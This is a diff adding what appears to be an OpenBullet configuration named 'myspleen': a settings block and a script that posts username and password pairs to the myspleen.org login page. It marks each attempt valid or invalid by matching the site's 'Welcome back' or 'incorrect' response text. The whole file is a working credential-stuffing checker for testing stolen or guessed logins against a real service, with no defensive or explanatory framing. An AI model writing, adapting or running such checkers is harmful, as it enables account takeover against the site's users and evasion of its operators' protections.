@@ -1,0 +1,38 @@
+[SETTINGS]
+{
+  "Name": "myspleen",
+  "SuggestedBots": 1,
+  "LastModified": "2018-10-14T05:44:32.1259652+00:00",
+  "AdditionalInfo": "",
+  "Author": "maxokream",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "None",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+#login REQUEST POST "https://www.myspleen.org/takelogin.php" AutoRedirect=TRUE 
+  CONTENT "username=<USER>&password=<PASS>&returnto=index.php" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Origin: https://www.myspleen.org" 
+  HEADER "Referer: https://www.myspleen.org/login.php" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=FALSE 
+  KEYCHAIN Failure OR 
+    KEY "Username or password incorrect" 
+  KEYCHAIN Success OR 
+    KEY "\">Welcome back,</span> " 
